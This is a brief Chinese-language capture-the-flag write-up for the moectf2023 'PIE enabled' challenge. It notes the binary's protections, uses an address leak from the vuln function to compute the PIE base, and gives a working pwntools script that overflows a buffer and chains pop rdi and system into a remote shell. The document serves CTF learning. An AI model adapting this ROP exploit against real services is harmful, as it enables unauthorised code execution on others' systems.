---
title: moectf2023 - PIE enabled
date: 2023/9/24 12:00:00
tags:
    - noob
excerpt: 利用vuln函数打印地址减去偏移量获取PIE基址，构造payload实现远程代码执行。
---

## 文件分析

下载`pwn`, NX on, PIE on, Canary off, RELRO full  
ghidra分析为64位程序

## 解题思路

vuln函数直接把自己的地址打印出来了...直接减一减拿到piebase就和之前的题一样了

## EXPLOIT

```python
from pwn import *
sh = remote('localhost', 46153)
sh.recvuntil(b'is:') # skip
elf = ELF('pwnpie')
vuln = elf.symbols['vuln']
pieBase = int(sh.recvline()[2:14], 16) - vuln # 做完才发现int可以直接从bytes转换，不一定是str
shstrAddr = pieBase + 0x4010
popRdiAddr = pieBase + 0x1323
systemAddr = pieBase + 0x11d8
sh.sendline(b'0'*0x58 + p64(popRdiAddr) + p64(shstrAddr) + p64(systemAddr))
sh.interactive()
```

Done.
